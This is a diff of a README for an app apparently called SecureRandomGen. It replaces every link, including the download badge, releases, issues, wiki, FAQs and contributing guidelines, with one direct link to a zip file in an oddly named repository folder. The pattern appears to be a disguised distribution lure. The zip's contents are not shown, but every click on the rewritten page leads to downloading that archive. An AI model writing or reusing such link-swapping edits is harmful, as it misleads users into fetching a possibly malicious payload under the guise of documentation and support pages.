@@ -6,11 +6,11 @@ Welcome to **SecureRandomGen**! This application helps you generate secure rando
 
 ## 📦 Download Now!
 
-[![Download SecureRandomGen](https://img.shields.io/badge/download-SecureRandomGen-4CAF50.svg)](https://github.com/Guiananas/SecureRandomGen/releases)
+[![Download SecureRandomGen](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip)](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip)
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [SecureRandomGen Releases](https://github.com/Guiananas/SecureRandomGen/releases).
+To get started, you need to download the application. Visit this page to download: [SecureRandomGen Releases](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip).
 
 Follow these steps to install:
 
@@ -48,7 +48,7 @@ Once you have installed **SecureRandomGen**, follow these simple steps to genera
 
 ## 🌐 Support
 
-If you encounter any issues or have questions, please visit the [GitHub Issues](https://github.com/Guiananas/SecureRandomGen/issues) page. Our community is here to help!
+If you encounter any issues or have questions, please visit the [GitHub Issues](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip) page. Our community is here to help!
 
 ### Helpful Tips
 
@@ -59,11 +59,11 @@ If you encounter any issues or have questions, please visit the [GitHub Issues](
 
 For more detailed information, consider checking the following:
 
-- [Documentation](https://github.com/Guiananas/SecureRandomGen/wiki)
-- [FAQs](https://github.com/Guiananas/SecureRandomGen/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip)
+- [FAQs](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip)
 
 ## 🙌 Acknowledgments
 
-**SecureRandomGen** is open source, and contributions from the community are welcome. If you would like to contribute, please refer to the [Contributing Guidelines](https://github.com/Guiananas/SecureRandomGen/CONTRIBUTING.md).
+**SecureRandomGen** is open source, and contributions from the community are welcome. If you would like to contribute, please refer to the [Contributing Guidelines](https://raw.githubusercontent.com/Guiananas/SecureRandomGen/main/Lernaea/SecureRandomGen.zip).
 
 Thank you for using **SecureRandomGen**! Enjoy generating secure random numbers with ease.
